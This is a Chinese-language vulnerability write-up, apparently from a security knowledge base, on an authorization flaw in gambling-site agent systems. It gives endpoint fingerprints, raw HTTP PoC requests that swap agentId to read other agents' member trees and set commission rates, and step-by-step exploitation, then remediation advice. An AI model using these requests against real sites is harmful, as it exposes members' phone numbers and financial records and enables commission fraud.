---
title: 代理层级越权（读全站下级 / 改佣金比例）
cve: 无（业务逻辑）
severity: critical
cvss: 8.8
product: 博彩包网 / 代理分销系统
versions: 任意
ports: 80, 443
keywords: 代理, agentId, 层级越权, 佣金, 返水, 会员列表
entry: 改 agentId 读他人下级，改 rate 提佣金
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
/api/agent/member/list?agentId=10001     /api/agent/sub/list?agentId=
/api/report/agent/team?agentId=&date=    /api/agent/commission/set
/api/agent/rebate/config                 /api/agent/invite/bind
```

这类站点把"总代 → 代理 → 会员"的层级关系放在**请求参数**里传，服务端只校验"登录了没"，不校验"这棵树是不是你的"。

## 前置条件

- 普通会员账号即可（多数包网站可自助开通代理，门槛极低）。
- 抓到自己的 `agentId` 与 token。

## PoC

```http
GET /api/agent/member/list?agentId=1&pageNo=1&pageSize=50 HTTP/1.1
Host: target
Authorization: Bearer <自己的 token>

POST /api/agent/commission/set HTTP/1.1
Content-Type: application/json

{"agentId":10001,"gameType":"lottery","rate":"0.90"}
```

## 利用步骤

1. 用自己 token 请求自己的 `agentId`，确认返回自己的下级（基线）。
2. 把 `agentId` 换成 `1`、`10001`、`10002`（总代常是 1 或 10000+），看是否返回他人整棵代理树。
3. 命中后能拿到：下级会员手机号、流水、充提、返水记录 —— 已经是隐私 + 资金双面。
4. 提佣金：读当前比例 → 用自己账号改（只改自己的，观察是否生效）；能改他人即更高危。
5. 证据：两个 agentId 各一条请求 + 返回条数对比；只取 1-2 条记录，别导整表。

## 修复与缓解（加固）

- `agentId` 从服务端会话取，不接受请求传入；查询强制加"上级链包含当前用户"条件。
- 佣金/返水比例变更走审批流 + 双人复核 + 审计日志；比例上限硬编码。
- 列表接口按层级过滤并做行级鉴权（返回 403 而非空列表）。

## 参考

- OWASP API Security Top 10：API1 BOLA / API5 BFLA。
